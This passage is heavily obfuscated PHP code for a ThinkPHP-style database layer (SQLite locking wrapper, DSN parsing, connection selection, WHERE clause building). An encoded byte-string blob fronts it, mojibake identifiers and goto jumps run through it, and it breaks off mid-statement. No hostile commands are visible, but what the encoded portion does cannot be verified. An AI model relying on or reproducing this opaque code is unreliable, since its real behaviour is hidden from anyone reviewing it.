\377\31\214\230\124\170\255\132\322\310\371\214\76\120\226\220\237\101\275\232\355\225\120\120\222\135"."\xea\x76\x84\xcc\x2e\x10\x5\x71\x54\x76\xf6\xdb\x55\x3c\xca\x26\xca\xe8\xf7\x28\x53\x1\x95\x59\xb6\xca\x8f\x5a\xb\x5f\x8f\x12\xf\x88\x73\x33\x2b\xf8\x29\x24\xd\xc4\x8\xdb\xc9\x4d\xc9\xf\xe7\x12\xb\x66\xe1".base64_decode('nogsUMdildzgyxbApCB5FZQXLT1DLERSRIYFPYIlTFQ0SDMD7dx+XJP0DZ1yMubshC8SPPY=')."\xd2\xb\xf5\xa6\xfc\x2d\x3d\x6f\x8d\x28\x7f\x84\x19\x67\xa0\xe6\x38\xce\xbb\x28\x2c\x1c\xbf\x4b\x54\x2a\xe5\x8a\x64\x63\x46\x48\x83\x78\x8b\x9d\x30\xc5\xd3\x81\x1d\x96\xbd\x14\x38\x4e\x58\xfc\x9d\x56\xc7\x89\xcb"."\162\77\326\214\370\107\307\143\64\51\261\47\303\36\15\304\222\330\342\321\332\244\355\126\354\254\342\253\253\224\23\1\111\366\114\216\151\74\321\341\314\1\373\67\164\121\14\346\42\302\162\75\377"._kodDe('KNNEya5sZe50tVXySeD12G9rz4ziUXbX6K6AVt+mMcbpcmLBZxtbSkrg42mGM2WG+sMBZXhO')."\320\32\22\346\232\353\314\331\45\363\201\251\261\173\75\55\233\225\166\340\312\7\240\262\207\350\21\116\16\362\227\307\53\5\334\46\307\356\107\351\173\211\244\230\275\52\337\57\310\13\216\253\224"."\x4d\x7e\xca\xda\xf5\x8c\x3d\x29\xb\xc5\x48\xa5\x70\xe5\x46\x0\xf6\xf2\xad\xdb\x92\x1a\x56\x41\xf6\xc0\x78\x76\x41\xf3\xf2\x46\x72\xb0\xc2\xed\x3e\x51\xf3\x75\x3e\xe4\x20\xb1\x38\x65\x60\xa2\xf9\x88\x13\xe2\x9a".base64_decode('xuwriU+qxJUOTIPs7iBSYGfaWthl+s9g1JC4WAGiKBNCR1QZ+Yw7JtcRKc+boHE+p28nyNE=')."\xe9\x7a\x69\x9b\x2\x59\xf2\xd8\x3a\x3d\x36\x48\x3a\xa8\xe5\x8a\x1f\xe5\x25\x71\x2a\x23\x67\xc1\x56\x8\x4e\x79\x1d\x9e\x62\x72\xd0\xa9\xf3\xba\x22\xea\xbd\xae\xe2\xf8\xc3\xe3\xce\x5\xe4\x78\x9\x9b\x2a\xcb\xa0"."\x55\x17\xc5\x72\x19\x26\x9f\x23\x57\x5f\xe4\xa2\xdc\x5b\x9e\x87\x2e\x96\x98\x80\x99\x62\xb9\x56\xa6\x1e\xbc\x51\x42\x46\x89\xbf\xe4\xf1\x60\x54\xa8\xbb\x68\x12\xd6\xd3\x19\xcb\x65\x55\x92\xf2\x77\x52\x12\x4\xbb"."\271\111\32\75\315\127\266\103\62\202\354\230\65\254\175\50\256\134\343\221\150\120\135\36\302\156\72\102\147\5\173\230\103\152\303\44\357\311\260\42\173\72\153\210\11\36\54\6\164\56\152\63\5"."\x5a\xe9\x88\x54\x4a\x52\x69\xe1\x55\xd9\xce\x15\x5a\xf8\x5\xb1\xd3\x4e\x5b\xb2\xfb\x60\x2e\xcb\x64\x39\xa9\x13\x18\xdb\xec\x38\xd7\xe5\xa2\x4a\x60\x49\xb3\x68\xc9\x6e\x48\x1d\x89\x98\xc5\x33\x51\x6a\x94\x1d\xed"."\x7\x98\x9a\x47\x4f\x1e\xad\x6e\x3d\x69\xeb\x29\x5\x73\xd\x8e\xe3\x42\xef\xac\xba\x99\xfd\x9f\x55\x1c\x4a\xe7\x90\xb3\x3e\x7\x12\xce\x2d\xb1\x99\x5e\xa6\xb1\xcc\x60\x2a\xe6\x33\xa9\x73\xa1\x4a\x69\x8\x49\x63"."\xb6\x3\x9b\xc4\xbb\x45\xee\xf7\x8a\x9c\xef\x13\x35\x4a\x2\x5c\xfa\xf4\x93\xe3\x61\xb3\xb2\x49\xea\x32\x5b\x4\x3f\xe3\x4a\xc3\xf4\x62\xea\x54\x7c\xf0\xe5\xd7\xe1\xec\xa5\x1a\xac\x1\xe8\xc7\x1e\xce\xb0\x85\x8a"."\x9f\x20\x22\xc8\xdd\x57\xaa\x39\x95\x29\x3f\x61\x71\x83\x90\x3a\x11\x32\x5c\x7e\xdc\x84\x9a\xec\xe2\x58\xa4\x18\xcd\x75\x95\xf9\x5\x74\x1a\x9b\x49\xf9\x89\x2c\x8a\x8a\x97\x1c\x52\x26\x50\x70\x90\xa3\xa4\xb\x7f"."\164\322\113\71\337\260\43\211\44\232\71\111\207\22\244\53\153\247\306\0\267\343\55\333\177\113\106\130\112\46\271\230\203\135\364\213\75\16\204\204\7\52\222\114\357\340\2\303\32\167\362\346\316"."\325\343\70\105\113\372\5\111\102\114\202\345\127\310\342\146\133\142\152\131\66\174\14\27\214\205\53\136\42\276\142\253\324\206\5\213\56\216\210\251\124\233\66\134\1\64\245\273\235\364\241\30\16"."\112\130\174\311\125\210\260\47\322\107\344\332\1\116\330\357\70\0\313\143\205\53\21\51\277\270\103\24\335\304\161\225\272\117\210\241\63\273\354\252\204\43\225\210\242\57\171\161\345\34\351\70\216".base64_decode('tZeE1g7tCpctiSqdjlE4GJ8zBEMsC72OWJdEAYvxGB/qSgLBllR8RfmXhAJ6NiwVJ6sUTJk=')."\41\126\271\22\201\225\316\41\226\74\312\210\4\306\351\230\216\301\227\266\67\336\61\200\214\312\211\216\346\124\100\15\166\64\161\350\217\224\45\232\331\54\276\44\236\42\231\252\34\113\233\161\71".strrev('îT†i²Åñå‰åÄ‘™;Gã”Î8sJcÜÉ¸×uáD™ÀZh<®G248X¸“‘ÒÚ„')."\x87\xbb\xb5\x6c\x96\xdd\xc2\x14\x51\x48\x59\x7b\x24\x4d\xa9\xb8\x59\x21\xf\x6d\x51\xc5\x6c\x34\x9\xe7\x14\xc7\x32\x47\xde\x29\x86\x0\xe7\xa5\x49\x38\x6f\x59\x32\xcb\x5c\x36\xae\x24\x9f\xad\x95\xac\x29\xba\x57"."\x3e\x78\x20\x9c\x4b\x55\xe8\xb0\x10\x61\x49\xa0\x53\x8d\x67\x45\xe0\xf2\xea\x60\xd\xb8\xa1\x89\x34\xaf\x72\x2b\x84\x10\xce\xa5\xa8\x52\xa9\x15\x15\x81\xa7\x6c\x85\x1b\x5a\xf0\x43\xf8\x10\x5e\x29\xa5\xe2\x2\x5".base64_decode('j/kVdgyWUmGPoPRvSs0voQ1VvlmJtAq6WbRKzJnJfjgrJMuKXpVVwaIV6Zvl1NFyxcsDBD4=')."\346\151\200\351\162\42\366\60\153\14\12\235\130\146\73\63\315\261\211\225\362\203\171\223\157\214\51\241\7\215\271\272\100\321\75\316\145\245\71\121\77\137\222\374\372\127\64\345\361\140\111\131\271"."\24\52\253\161\373\112\241\46\110\17\371\46\72\217\352\316\307\3\144\157\200\64\235\125\222\225\244\357\56\221\270\220\333\71\124\207\52\10\212\111\24\375\364\211\73\50\132\236\304\226\11\234\160"."\130\335\121\146\10\56\374\250\342\100\13\276\325\343\227\304\304\257\75\145\36\150\162\314\54\332\36\234\26\67\13\344\267\331\264\155\241\207\103\105\143\344\10\200\71\0\217\244\146\206\276\304\355"."\60\156\24\271\153\44\150\113\50\26\371\4\25\6\54\152\212\351\64\225\320\71\107\0\337\141\362\200\274\301\303\15\145\133\311\245\154\41\42\6\315\124\302\34\145\76\60\21\136\111\203\44\356"."\x2b\x35\x37\x57\x3b\xec\xb6\xfc\x96\x95\xe6\x88\x73\x17\xcb\x4f\x53\xfc\xf0\x6a\x95\x97\x94\x1\xef\xfb\xfa\xd6\x14\xd2\x8e\xec\xf4\x21\x52\xae\xa\xff\x59\x25\xc0\x6d\x86\x28\x82\x3e\x59\x43\x44\xcb\x60\x15\x18"."\213\307\312\222\272\3\261\330\362\110\264\225\276\160\123\226\114\162\111\332\210\145\111\335\35\221\256\251\322\202\235\201\120\270\54\15\53\56\166\251\302\233\52\115\12\165\223\126\222\73\373\251\132".base64_decode('EWpZIlrCLgTD8I6qmAXpgqyQMdm9F4OPaVkmq5KuVvSccK4r8jhFcPJsW8wLNv9wPiLp0ho=')."\166\52\267\60\244\206\142\261\76\142\27\324\24\55\100\54\176\25\210\323\6\176\272\20\152\60\76\207\206\215\24\117\326\17\41\110\22\136\312\173\75\271\100\345\222\71\222\74\275\342\340\311\327".base64_decode('MOUXgSRVDA5u5pkm6LiuMRPiQAcnPbDvh+GWNFDptyPZ1tJMcOrQJ6HydEwvhKT7/wAHMGQ=')."\xb5\x6d\xbc\x0\x0".""."".base64_decode(''), 10, -8))); goto C½©˜‚‘ğ„; D”ì×›Œò: define($_SERVER[¼¥ÊĞÙÌ][320], 3); define($_SERVER[¼¥ÊĞÙÌ][321], 1); define($_SERVER[¼¥ÊĞÙÌ][322], 0); goto EÈ‘†…›å; aÖˆ„†ª³ò: class DbSqlite3 extends DbSqlite3Base { public function query($˜©İ“¢½) { $’’¶›Ğ =& $_SERVER[¼¥ÊĞÙÌ]; if (!CacheLock::fileLock($’’¶›Ğ[13])) { return !1; } $»ßÆ¯„‹ = parent::query($˜©İ“¢½); CacheLock::fileUnLock($’’¶›Ğ[13]); return $»ßÆ¯„‹; } public function execute($¿şÙ‹—…) { $³È½âºÁ =& $_SERVER[¼¥ÊĞÙÌ]; if (!CacheLock::fileLock($³È½âºÁ[13])) { return !1; } $‹¦ÏûòÛ = parent::execute($¿şÙ‹—…); CacheLock::fileUnLock($³È½âºÁ[13]); return $‹¦ÏûòÛ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\x6e\x65\x71" => "\x3c\x3e", "\147\164" => "\x3e", "\145\147\x74" => "\x3e\x3d", "\x6c\164" => "\x3c", "\x65\x6c\x74" => "\74\x3d", "\156\157\x74\x6c\151\153\145" => "\116\117\x54\40\114\111\x4b\105", "\x6c\151\x6b\x65" => "\x4c\111\x4b\105", "\x69\x6e" => "\111\x4e", "\156\157\164\x69\156" => "\116\117\x54\x20\111\116", "\156\x6f\x74\x20\151\x6e" => "\x4e\x4f\124\40\111\x4e", "\142\x65\164\167\145\145\156" => "\102\x45\x54\x57\x45\105\x4e", "\x6e\x6f\164\142\145\x74\x77\x65\145\156" => "\x4e\x4f\124\40\x42\105\124\127\x45\105\116", "\156\157\164\40\x62\x65\164\x77\x65\145\156" => "\x4e\117\x54\x20\102\x45\124\127\x45\x45\x4e"); protected $selectSql = "\x53\105\x4c\105\103\x54\45\104\x49\x53\124\x49\x4e\x43\124\x25\x20\x25\106\x49\x45\114\x44\x25\x20\x46\122\117\x4d\x20\45\x54\x41\x42\114\x45\x25\x25\x4a\117\111\116\45\x25\127\x48\x45\122\x45\x25\45\x47\122\x4f\x55\x50\45\45\110\x41\126\111\116\x47\x25\x25\x4f\x52\104\105\122\45\45\x4c\111\115\x49\124\45\40\45\125\x4e\x49\x4f\x4e\x25\45\x43\117\x4d\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $Š†º•Ñ­ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¼¥ÊĞÙÌ][1046], $Š†º•Ñ­); } public function factory($÷Áï±ÁĞ = '') { $‡İ¼ã­‹ =& $_SERVER[¼¥ÊĞÙÌ]; $÷Áï±ÁĞ = $this->parseConfig($÷Áï±ÁĞ); if (empty($÷Áï±ÁĞ[$‡İ¼ã­‹[1047]])) { think_exception(think_lang($‡İ¼ã­‹[1048])); } $this->dbType = ucwords(strtolower($÷Áï±ÁĞ[$‡İ¼ã­‹[1047]])); $Ï™ûı¬ = $‡İ¼ã­‹[1049] . $this->dbType; if (class_exists($Ï™ûı¬)) { $öØ—¦¤ = new $Ï™ûı¬($÷Áï±ÁĞ); if ($‡İ¼ã­‹[1050] != strtolower($÷Áï±ÁĞ[$‡İ¼ã­‹[1047]])) { $öØ—¦¤->dbType = strtoupper($this->dbType); } else { $öØ—¦¤->dbType = $this->_getDsnType($÷Áï±ÁĞ[$‡İ¼ã­‹[1002]]); } } else { think_exception(think_lang($‡İ¼ã­‹[1051]) . $‡İ¼ã­‹[1052] . $Ï™ûı¬); } return $öØ—¦¤; } public function __call($¾Ïğ’, $»ÂÃİ­¥) { if (method_exists($this, $¾Ïğ’)) { return call_user_func_array(array($this, $¾Ïğ’), $»ÂÃİ­¥); } } protected function _getDsnType($¯»™Ù‰‰) { $Åí­ øè = explode($_SERVER[¼¥ÊĞÙÌ][4], $¯»™Ù‰‰); $‰¾îÎ›Ë = strtoupper(trim($Åí­ øè[0])); return $‰¾îÎ›Ë; } private function parseConfig($âãŠš¾Æ = '') { $«ÀÑ·¸ =& $_SERVER[¼¥ÊĞÙÌ]; if (!empty($âãŠš¾Æ) && is_string($âãŠš¾Æ)) { $âãŠš¾Æ = $this->parseDSN($âãŠš¾Æ); } elseif (is_array($âãŠš¾Æ)) { $âãŠš¾Æ = array_change_key_case($âãŠš¾Æ); $âãŠš¾Æ = array($«ÀÑ·¸[1047] => $âãŠš¾Æ[$«ÀÑ·¸[1053]], $«ÀÑ·¸[974] => $âãŠš¾Æ[$«ÀÑ·¸[1054]], $«ÀÑ·¸[975] => $âãŠš¾Æ[$«ÀÑ·¸[1055]], $«ÀÑ·¸[972] => $âãŠš¾Æ[$«ÀÑ·¸[1056]], $«ÀÑ·¸[973] => $âãŠš¾Æ[$«ÀÑ·¸[1057]], $«ÀÑ·¸[21] => $âãŠš¾Æ[$«ÀÑ·¸[1058]], $«ÀÑ·¸[1002] => $âãŠš¾Æ[$«ÀÑ·¸[1059]], $«ÀÑ·¸[17] => isset($âãŠš¾Æ[$«ÀÑ·¸[1060]]) ? $âãŠš¾Æ[$«ÀÑ·¸[1060]] : array()); } elseif (empty($âãŠš¾Æ)) { if (think_config($«ÀÑ·¸[1061]) && $«ÀÑ·¸[1050] != strtolower(think_config($«ÀÑ·¸[1062]))) { $âãŠš¾Æ = $this->parseDSN(think_config($«ÀÑ·¸[1061])); } else { $âãŠš¾Æ = array($«ÀÑ·¸[1047] => think_config($«ÀÑ·¸[1062]), $«ÀÑ·¸[974] => think_config($«ÀÑ·¸[1063]), $«ÀÑ·¸[975] => think_config($«ÀÑ·¸[1064]), $«ÀÑ·¸[972] => think_config($«ÀÑ·¸[1065]), $«ÀÑ·¸[973] => think_config($«ÀÑ·¸[1066]), $«ÀÑ·¸[21] => think_config($«ÀÑ·¸[326]), $«ÀÑ·¸[1002] => think_config($«ÀÑ·¸[1061]), $«ÀÑ·¸[17] => think_config($«ÀÑ·¸[1067])); } } return $âãŠš¾Æ; } protected function initConnect($ÔÙˆŸ¸ = true) { if (1 == think_config($_SERVER[¼¥ÊĞÙÌ][22])) { $this->_linkID = $this->multiConnect($ÔÙˆŸ¸); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ïşœ¨à• => $ñÎê½İÄ) { $this->_linkID = $ñÎê½İÄ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($óÛİ˜‰¾ = false) { $Ÿá–Ÿè =& $_SERVER[¼¥ÊĞÙÌ]; static $ú®ÚÙÉ² = array(); static $‡â¢öÓ = -1; if (empty($ú®ÚÙÉ²)) { foreach ($this->config as $È¬ÎÎâ¼ => $ßñ±í‘) { $ú®ÚÙÉ²[$È¬ÎÎâ¼] = explode($Ÿá–Ÿè[50], $ßñ±í‘); } } if (think_config($Ÿá–Ÿè[1068])) { if ($óÛİ˜‰¾ || think_config($Ÿá–Ÿè[474]) === !0) { $àı½•†Â = floor(mt_rand(0, think_config($Ÿá–Ÿè[1069]) - 1)); $‡â¢öÓ = $àı½•†Â; } else { if (is_numeric(think_config($Ÿá–Ÿè[1070]))) { $àı½•†Â = think_config($Ÿá–Ÿè[1070]); } else { $àı½•†Â = floor(mt_rand(think_config($Ÿá–Ÿè[1069]), count($ú®ÚÙÉ²[$Ÿá–Ÿè[972]]) - 1)); } } } else { $àı½•†Â = floor(mt_rand(0, count($ú®ÚÙÉ²[$Ÿá–Ÿè[972]]) - 1)); $‡â¢öÓ = $àı½•†Â; } $àı½•†Â = $‡â¢öÓ !== -1 ? $‡â¢öÓ : $àı½•†Â; $ğØûÛı = array($Ÿá–Ÿè[974] => isset($ú®ÚÙÉ²[$Ÿá–Ÿè[974]][$àı½•†Â]) ? $ú®ÚÙÉ²[$Ÿá–Ÿè[974]][$àı½•†Â] : $ú®ÚÙÉ²[$Ÿá–Ÿè[974]][0], $Ÿá–Ÿè[975] => isset($ú®ÚÙÉ²[$Ÿá–Ÿè[975]][$àı½•†Â]) ? $ú®ÚÙÉ²[$Ÿá–Ÿè[975]][$àı½•†Â] : $ú®ÚÙÉ²[$Ÿá–Ÿè[975]][0], $Ÿá–Ÿè[972] => isset($ú®ÚÙÉ²[$Ÿá–Ÿè[972]][$àı½•†Â]) ? $ú®ÚÙÉ²[$Ÿá–Ÿè[972]][$àı½•†Â] : $ú®ÚÙÉ²[$Ÿá–Ÿè[972]][0], $Ÿá–Ÿè[973] => isset($ú®ÚÙÉ²[$Ÿá–Ÿè[973]][$àı½•†Â]) ? $ú®ÚÙÉ²[$Ÿá–Ÿè[973]][$àı½•†Â] : $ú®ÚÙÉ²[$Ÿá–Ÿè[973]][0], $Ÿá–Ÿè[21] => isset($ú®ÚÙÉ²[$Ÿá–Ÿè[21]][$àı½•†Â]) ? $ú®ÚÙÉ²[$Ÿá–Ÿè[21]][$àı½•†Â] : $ú®ÚÙÉ²[$Ÿá–Ÿè[21]][0], $Ÿá–Ÿè[1002] => isset($ú®ÚÙÉ²[$Ÿá–Ÿè[1002]][$àı½•†Â]) ? $ú®ÚÙÉ²[$Ÿá–Ÿè[1002]][$àı½•†Â] : $ú®ÚÙÉ²[$Ÿá–Ÿè[1002]][0], $Ÿá–Ÿè[17] => isset($ú®ÚÙÉ²[$Ÿá–Ÿè[17]][$àı½•†Â]) ? $ú®ÚÙÉ²[$Ÿá–Ÿè[17]][$àı½•†Â] : $ú®ÚÙÉ²[$Ÿá–Ÿè[17]][0]); return $this->connect($ğØûÛı, $àı½•†Â); } public function parseDSN($ş×‘÷çğ) { $¿§„é¸— =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($ş×‘÷çğ)) { return !1; } $æğğëŒ† = parse_url($ş×‘÷çğ); if ($æğğëŒ†[$¿§„é¸—[208]]) { $Û€²•í = array($¿§„é¸—[1047] => $æğğëŒ†[$¿§„é¸—[208]], $¿§„é¸—[974] => isset($æğğëŒ†[$¿§„é¸—[670]]) ? $æğğëŒ†[$¿§„é¸—[670]] : $¿§„é¸—[12], $¿§„é¸—[975] => isset($æğğëŒ†[$¿§„é¸—[1071]]) ? $æğğëŒ†[$¿§„é¸—[1071]] : $¿§„é¸—[12], $¿§„é¸—[972] => isset($æğğëŒ†[$¿§„é¸—[209]]) ? $æğğëŒ†[$¿§„é¸—[209]] : $¿§„é¸—[12], $¿§„é¸—[973] => isset($æğğëŒ†[$¿§„é¸—[210]]) ? $æğğëŒ†[$¿§„é¸—[210]] : $¿§„é¸—[12], $¿§„é¸—[21] => isset($æğğëŒ†[$¿§„é¸—[87]]) ? substr($æğğëŒ†[$¿§„é¸—[87]], 1) : $¿§„é¸—[12]); } else { preg_match($¿§„é¸—[1072], trim($ş×‘÷çğ), $ú¸ÖƒêÀ); $Û€²•í = array($¿§„é¸—[1047] => $ú¸ÖƒêÀ[1], $¿§„é¸—[974] => $ú¸ÖƒêÀ[2], $¿§„é¸—[975] => $ú¸ÖƒêÀ[3], $¿§„é¸—[972] => $ú¸ÖƒêÀ[4], $¿§„é¸—[973] => $ú¸ÖƒêÀ[5], $¿§„é¸—[21] => $ú¸ÖƒêÀ[6]); } $Û€²•í[$¿§„é¸—[1002]] = $¿§„é¸—[12]; return $Û€²•í; } protected function debug() { $Ô²„ª¥® =& $_SERVER[¼¥ÊĞÙÌ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ô²„ª¥®[1073]; if (think_config($Ô²„ª¥®[1074])) { think_status($Ô²„ª¥®[1075]); think_trace($this->queryStr . $Ô²„ª¥®[1076] . think_status($Ô²„ª¥®[24], $Ô²„ª¥®[1075], 6) . $Ô²„ª¥®[1077], $Ô²„ª¥®[12], $Ô²„ª¥®[1078]); } } protected function parseLock($Î½¡ÖÖ« = false) { $şØªï¿é =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Î½¡ÖÖ«) { return $şØªï¿é[12]; } if ($şØªï¿é[1004] == $this->dbType) { return $şØªï¿é[1079]; } return $şØªï¿é[1080]; } protected function parseSet($Şåáïğ‡) { $î§¾¸ıê =& $_SERVER[¼¥ÊĞÙÌ]; foreach ($Şåáïğ‡ as $ƒ‘”È“ => $·§û‰ˆ) { if (is_array($·§û‰ˆ) && $î§¾¸ıê[375] == $·§û‰ˆ[0]) { $ë±êÔ¸…[] = $this->parseKey($ƒ‘”È“) . $î§¾¸ıê[509] . $·§û‰ˆ[1]; } elseif (is_scalar($·§û‰ˆ) || is_null($·§û‰ˆ)) { $ë±êÔ¸…[] = $this->parseKey($ƒ‘”È“) . $î§¾¸ıê[509] . $this->parseValue($·§û‰ˆ); } } return $î§¾¸ıê[1081] . implode($î§¾¸ıê[50], $ë±êÔ¸…); } protected function bindParam($ö­â‘¥, $ÚøŒó™µ) { $this->bind[$_SERVER[¼¥ÊĞÙÌ][4] . $ö­â‘¥] = $ÚøŒó™µ; } protected function parseBind($Ú×şæô¸) { $Ú×şæô¸ = array_merge($this->bind, $Ú×şæô¸); $this->bind = array(); return $Ú×şæô¸; } function parseKey(&$Æ…íÎºõ, $…è¸Ößö = true) { if ($…è¸Ößö) { $Æ…íÎºõ = $this->parseKeyCheck($Æ…íÎºõ); } return $Æ…íÎºõ; } function parseKeyCheck($ƒÇÆ³Õ·) { $ÕÕÉ²» =& $_SERVER[¼¥ÊĞÙÌ]; $ƒÇÆ³Õ· = trim($ƒÇÆ³Õ·); if (!preg_match($ÕÕÉ²»[1082], $ƒÇÆ³Õ·)) { think_exception($ÕÕÉ²»[1083] . $ƒÇÆ³Õ·); } return $ƒÇÆ³Õ·; } protected function parseValue($®ß·¨É) { $Ç‘ ¼ØÍ =& $_SERVER[¼¥ÊĞÙÌ]; if (is_string($®ß·¨É)) { $®ß·¨É = $Ç‘ ¼ØÍ[1043] . $this->escapeString($®ß·¨É) . $Ç‘ ¼ØÍ[1043]; } elseif (isset($®ß·¨É[0]) && is_string($®ß·¨É[0]) && strtolower($®ß·¨É[0]) == $Ç‘ ¼ØÍ[375]) { $®ß·¨É = $this->escapeString($®ß·¨É[1]); } elseif (is_array($®ß·¨É)) { $®ß·¨É = array_map(array($this, $Ç‘ ¼ØÍ[1044]), $®ß·¨É); } elseif (is_bool($®ß·¨É)) { $®ß·¨É = $®ß·¨É ? $Ç‘ ¼ØÍ[91] : $Ç‘ ¼ØÍ[231]; } elseif (is_null($®ß·¨É)) { $®ß·¨É = $Ç‘ ¼ØÍ[106]; } return $®ß·¨É; } protected function parseField($ ÂÌ¬©) { $¡íäœËş =& $_SERVER[¼¥ÊĞÙÌ]; if (is_string($ ÂÌ¬©) && strpos($ ÂÌ¬©, $¡íäœËş[50])) { $ ÂÌ¬© = explode($¡íäœËş[50], $ ÂÌ¬©); } if (is_array($ ÂÌ¬©)) { $ÒõŸÁ¦ = array(); foreach ($ ÂÌ¬© as $¥«­‰½Ô => $œï¸ÒŠ) { if (!is_numeric($¥«­‰½Ô)) { $ÒõŸÁ¦[] = $this->parseKey($¥«­‰½Ô, !1) . $¡íäœËş[1084] . $this->parseKey($œï¸ÒŠ); } else { $ÒõŸÁ¦[] = $this->parseKey($œï¸ÒŠ); } } $…™¼ïê¡ = implode($¡íäœËş[50], $ÒõŸÁ¦); } elseif (is_string($ ÂÌ¬©) && !empty($ ÂÌ¬©)) { $…™¼ïê¡ = $ ÂÌ¬©; } else { $…™¼ïê¡ = $¡íäœËş[223]; } return $…™¼ïê¡; } protected function parseTable($ıİÀª¨«) { $Ô½Äú©‘ =& $_SERVER[¼¥ÊĞÙÌ]; if (is_array($ıİÀª¨«)) { $¹”³È± = array(); foreach ($ıİÀª¨« as $½³é°‰¬ => $â¡ã‘óí) { if (!is_numeric($½³é°‰¬)) { $¹”³È±[] = $this->parseKey($½³é°‰¬) . $Ô½Äú©‘[53] . $this->parseKey($â¡ã‘óí); } else { $¹”³È±[] = $this->parseKey($½³é°‰¬); } } $ıİÀª¨« = $¹”³È±; } elseif (is_string($ıİÀª¨«)) { if (strstr($ıİÀª¨«, $Ô½Äú©‘[53])) { return $ıİÀª¨«; } $ıİÀª¨« = explode($Ô½Äú©‘[50], $ıİÀª¨«); array_walk($ıİÀª¨«, array($this, $Ô½Äú©‘[992])); } return $Ô½Äú©‘[986] . trim(implode($Ô½Äú©‘[1085], $ıİÀª¨«), $Ô½Äú©‘[464]) . $Ô½Äú©‘[986]; } protected function parseWhere($Ìİ¾’ªÄ) { $»ıÇ‚¹ =& $_SERVER[¼¥ÊĞÙÌ]; $ïÆÌ = $»ıÇ‚¹[12]; if (is_string($Ìİ¾’ªÄ)) { $ïÆÌ = $Ìİ¾’ªÄ; } else { $ºĞ‡Ììé = isset($Ìİ¾’ªÄ[$»ıÇ‚¹[1086]]) ? strtoupper($Ìİ¾’ªÄ[$»ıÇ‚¹[1086]]) : $»ıÇ‚¹[12]; if (in_array($ºĞ‡Ììé, array($»ıÇ‚¹[1087], $»ıÇ‚¹[1088], $»ıÇ‚¹[1089]))) { $ºĞ‡Ììé = $»ıÇ‚¹[53] . $ºĞ‡Ììé . $»ıÇ‚¹[53]; unset($Ìİ¾’ªÄ[$»ıÇ‚¹[1086]]); } else { $ºĞ‡Ììé = $»ıÇ‚¹[1090]; } foreach ($Ìİ¾’ªÄ as $†°š­ïƒ => $Ù™¨²°é) { $ïÆÌ .= $»ıÇ‚¹[357]; if (is_numeric($†°š­ïƒ)) { $†°š­ïƒ = $»ıÇ‚¹[1091]; } if (0 === strpos($†°š­ïƒ, $»ıÇ‚¹[11])) { $ïÆÌ .= $this->parseThinkWhere($†°š­ïƒ, $Ù™¨²°é); } else { if (!preg_match($»ıÇ‚¹[1092], trim($†°š­ïƒ))) { think_exception(think_lang($»ıÇ‚¹[1093]) . $»ıÇ‚¹[4] . $†°š­ïƒ); } $Å¦×Ï»¤ = is_array($Ù™¨²°é) && isset($Ù™¨²°é[$»ıÇ‚¹[1094]]); $†°š­ïƒ = trim($†°š­ïƒ); if (strpos($†°š­ïƒ, $»ıÇ‚¹[215])) { $¨ïÕŸğ‡ = explode($»ıÇ‚¹[215], $†°š­ïƒ); $Á›¯Ğ¾¤ = array(); foreach ($¨ïÕŸğ‡ as $‡¦í“â— => $»‰–£”§) { $±ŒĞÏÎ– = $Å¦×Ï»¤ ? $Ù™¨²°é[$‡¦í“â—] : $Ù™¨²°é; $Á›¯Ğ¾¤[] = $»ıÇ‚¹[340] . $this->parseWhereItem($this->parseKey($»‰–£”§), $±ŒĞÏÎ–) . $»ıÇ‚¹[991]; } $ïÆÌ .= implode($»ıÇ‚¹[1095], $Á›¯Ğ¾¤); } elseif (strpos($†°š­ïƒ, $»ıÇ‚¹[287])) { $¨ïÕŸğ‡ = explode($»ıÇ‚¹[287], $†°š­ïƒ); $Á›¯Ğ¾¤ = array(); foreach ($¨ïÕŸğ‡ as $‡¦í“â— => $»‰–£”§) { $±ŒĞÏÎ– = $Å¦×Ï»¤ ? $Ù™¨²°é[$‡¦í“â—] : $Ù™¨²°é; $Á›¯Ğ¾¤[] = $»ıÇ‚¹[340] . $this->parseWhereItem($this->parseKey($»‰–£”§), $±ŒĞÏÎ–) . $»ıÇ‚¹[991]; } $ïÆÌ .= implode($»ıÇ‚¹[1090], $Á›¯Ğ¾¤); } else { $ïÆÌ .= $this->parseWhereItem($this->parseKey($†°š­ïƒ), $Ù™¨²°é); } } $ïÆÌ .= $»ıÇ‚¹[358] . $ºĞ‡Ììé; } $ïÆÌ = substr($ïÆÌ, 0, -strlen($ºĞ‡Ììé)); } return empty($ïÆÌ) ? $»ıÇ‚¹[12] : $»ıÇ‚¹[1096] . $ïÆÌ; } protected function parseWhereItem($³•éÀıú, $Ù“Ï¯ÁĞ) { $à•¼ß =& $_SERVER[¼¥ÊĞÙÌ]; $ÕåÁ‚ = $à•¼ß[12]; if (is_array($Ù“Ï¯ÁĞ)) { if (is_string($Ù“Ï¯ÁĞ[0])) { $×ºä”Ì = strtolower($Ù“Ï¯ÁĞ[0]); if (in_array($Ù“Ï¯ÁĞ[0], array($à•¼ß[509], $à•¼ß[1097], $à•¼ß[1098], $à•¼ß[1099], $à•¼ß[1100], $à•¼ß[1101]))) { $ÕåÁ‚ .= $³•éÀıú . $à•¼ß[53] . $Ù“Ï¯ÁĞ[0] . $à•¼ß[53] . $this->parseValue($Ù“Ï¯ÁĞ[1]); } elseif (preg_match($à•¼ß[1102], $Ù“Ï¯ÁĞ[0])) { $ÕåÁ‚ .= $³•éÀıú . $à•¼ß[53] . $this->exp[$×ºä”Ì] . $à•¼ß[53] . $this->parseValue($Ù“Ï¯ÁĞ[1]); } elseif (preg_match($à•¼ß[1103], $Ù“Ï¯ÁĞ[0])) { if 